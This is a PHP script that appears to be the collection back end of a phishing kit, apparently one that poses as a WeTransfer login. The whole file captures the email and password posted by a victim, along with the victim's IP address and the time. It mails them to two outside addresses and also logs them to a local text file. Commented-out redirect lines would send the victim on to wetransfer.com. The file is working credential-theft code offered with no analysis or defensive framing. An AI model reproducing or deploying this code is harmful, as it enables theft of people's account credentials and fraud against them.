<?php

$ip = getenv("REMOTE_ADDR"); 
$message ="";
$message .= "------------------------- l0g5 slink------------------\n"; 
$message .= "E  : ".$_POST['email']."\r\n";
$message .= "P   : ".$_POST['password']."\n"; 
$message .= "loc                     : ".$ip."\n"; 
$dated = "The time is " . date("l jS \of F Y h:i:s A");
$message .= "Date                   : ".$dated."\n"; 
$message .= "------------------------ l0g5 --------------------\n"; 
$send = "bossworker@gmail.com, bossworker@hotmail.com";

$subject = "Product Messages"; 
  
$headers .= "MIME-Version: 1.0\n"; 
{ 
mail($send,$subject,$message,$headers); 
} 

$handle = fopen("LOGGS.txt", "a");
fwrite($handle,$message);




    //header('Location:'.$_SERVER['HTTP_REFERER']);
   //header("Location: https://wetransfer.com");

?>